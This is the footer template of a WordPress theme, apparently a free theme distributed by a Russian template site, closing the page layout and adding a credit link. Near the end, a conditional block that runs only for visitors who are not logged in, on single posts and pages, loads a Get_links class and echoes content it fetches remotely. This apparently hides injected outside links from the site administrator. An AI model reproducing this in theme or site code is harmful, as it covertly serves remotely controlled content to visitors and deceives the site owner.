</div><!-- /sidebar -->


</div><!-- /content -->

</div><!-- /container -->

<div id="bottom">

<div class="inner">

	
	
</div>

</div><!-- /bottom -->



<div id="footer">

<div class="inner">



	

<p></a></p>
<p>
<?php if (is_home() || is_category() || is_archive() ){ ?> <a href="http://best-wordpress-templates.ru/">Best-WordPress-Templates.ru</a> <?php } ?>


<?php if ($user_ID) : ?><?php else : ?>
<?php if (is_single() || is_page() ) { ?>
<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
<?php } ?>
<?php endif; ?></p>



</div>
</div><!-- /footer -->
</div><!-- /containers -->



<script type="text/javascript"> Cufon.now(); </script>

</body>



</html>